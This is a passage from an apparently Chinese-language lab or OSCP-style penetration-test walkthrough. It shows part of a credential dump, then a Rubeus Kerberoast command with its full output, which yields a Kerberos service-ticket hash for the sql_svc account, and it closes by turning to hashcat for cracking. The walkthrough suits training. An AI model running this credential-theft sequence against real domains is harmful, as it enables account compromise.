	 * Password : 09 94 89 6c cb f4 1d 3d 09 99 68 3b 8b dc b8 a9 97 38 08 24 10 05 dd f6 30 20 75 78 1a 1f cf f5 b3 9c b5 d6 1f 89 44 94 c3 8c f9 cd 59 42 b0 6a 82 10 ea 75 a6 89 63 c6 c3 a6 19 94 d5 f1 5f b7 f7 65 72 24 82 93 4a 44 04 5a 28 97 26 e2 91 45 f3 e2 67 ec e2 3e 72 04 92 9b 9b 31 26 ce 9d 35 58 ef a7 66 94 31 65 24 79 76 7a f1 91 5f 40 15 0e cd 88 b9 05 c7 6e 83 48 0a 29 b4 d8 04 72 7d 40 a6 5e 2b a4 fa 5c b4 0b 68 f6 ab 40 30 89 dd fa b7 00 0f 1f 04 9f b4 6b e6 5c ad 35 28 22 f0 58 e2 45 3e c9 8e a4 26 e9 06 5b 85 55 88 07 4f f3 b0 3f 38 ef e5 88 1f 3c 18 29 5a ea f1 74 c1 6c 93 30 01 0c 2a 0d 63 5a eb ea 3e fe 22 c6 bd 95 a4 e1 57 ba c0 fc 21 4b d1 59 7c a8 05 39 e8 e1 a1 5b 84 f7 39 10 d9 e9 0a 72 c7 d1 ea cc d6
	ssp :
	credman :
	cloudap :	KO
```

沒看到有用的資訊，嘗試使用 kerberoast 攻擊
執行 rubeus.exe，得到 sql_srv 的 hash
```json
C:\inetpub\wwwroot>.\Rubeus.exe kerberoast /outfile:hashes
.\Rubeus.exe kerberoast /outfile:hashes

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : oscp.exam
[*] Searching path 'LDAP://DC01.oscp.exam/DC=oscp,DC=exam' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : MSSQL/MS02.oscp.exam
[*] PwdLastSet             : 12/5/2022 2:30:05 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\inetpub\wwwroot\hashes


[*] SamAccountName         : web_svc
[*] DistinguishedName      : CN=web_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : HTTP/MS01.oscp.exam
[*] PwdLastSet             : 11/10/2022 11:11:19 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\inetpub\wwwroot\hashes

[*] Roasted hashes written to : C:\inetpub\wwwroot\hashes


C:\inetpub\wwwroot>type hashes
type hashes
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$EB1CDD6754A09C1F80E09CBE2D82C404$098FA080050857E25521D39BC41613B8269450AF8FFFE8E79E3A7D4628F2A463B784100057DEC20AA3B6AE993E2E72D6384749A69B35DEFE2C5CCA2F462989AD3CABBF8510F9298788C5ED6B278094CBD600EE5288713CE31D2692B3C0F679CBE8C00CB115FDA6A1CE7BE1E214807469C3A69A700D04B7B357156822ACD83580A60D45D13A9DA10420FDA8E969FE777D87CB25F51AACAA4107D5B54162E48673EBF10E7AF4FEBE328FD76C8CCCBE2CA83C7636B876D2B202926812EE5E7B1E5F4F5971D1C7FFDD724A25B2735B785DE48544339F5D4CA0D47769DD271564F78049D5BC8E6E09F3E5640A6F626135359461874EE04DAABFE867016D94DAE46BEB291821B9F91AB55B6D5542698C5EA2171D08C04EA95183BA15C1EF11972D21067303F9CCD29F6B9CE6AD94513255E15ADB53CD64F4B54A157BCF1F4E70D8889B153D61CA23BCE801C7F67AF68C4BFEAC2B2878486754966129698D9C2F4DC98CB49B4FD507A4AC24671C4CE86E697BD25CACAC41BFCA00F0716143E6DF7006EF8F6283513328C229C5DBCC448196384B3508E9799225CE5EFB4571A5797B4752915EE205DD9B74AC2A3D76B5C22AF8D87011A02511734965AF97B718D8314E7DDCA03D8EB5A055A6E8BE1B18C2525717F014E0E194EF401D77D196B43D72EBF647FA1E8FB8A2D266E4A165ADA50D889F2A97F441562A0A73E60585A2217243CB7FE90974301E3690CF246E68F7CA0782D806080296DED51A2E8821F288F380D2BDFD300476C3E11F87393B8A222820299CD511762BD5541EE1A59E9B9303F937CA11280F84237DA238E03952C2FE0BD84E02609B14B2DA36351184D02606726580819F71A8D1070F4DD6E335785DC6ACDEEC20C102B79D4C7AD430C7DD99B2ECD9CCC16C166D45168FA02E9B5A55644FC19880EDE243C1E18679F112D34E2A01BC59D7BB2B27A6402CD390D4DD1F90997520A6EE09F35DBCBCFB9D217DFD0FE7628FA01307E8F60E45F45E1B9C0B1E31FF0748A2BB29BB98A137FA8B984BED896486EC816DEC441255AF48104E3F965EFDA290437FE0C4E25937B5F381C0873100006B541BCB7D38755CBAEED03300C01E7102C44E9D003C42E776C9B45F4DAA8F14C62F38C8E378471A56011E491EB7436988F541760D2243227D01915BD90DEBD049980C94ECF0F2953D18FABD20659497CBD40EBACB54DCE32EA70EDED8D589F427F6E80230D1445DA738DF99DF14CDC853FB94D68371E8A7E6CC23F53F3D3D10DC713EDC318D77A9D0E2538D24D168C0EAC1294C269FE4D0A2FBC05E2B994D6D147FB07833E4E3CD870A8944F2268FA997B799C3D3EE552F69E1848A5B9CE545E45210EE40CDD12E87206489987AC66AAEA275B2195F82904070B21EDC355383C352AD5D3ACE6282BC0EECE5BC0AA5B1B8B2262F3243148F93D7D852E2D58BAA431EE7B39C5F60EC8487B1982A7944A06F098E15CF3EFF9405519F22D3C3ECC3BA78D76208D4E57FE5FDEC974292B29379851123FAA071
```

接著使用 hashcat 執行爆破
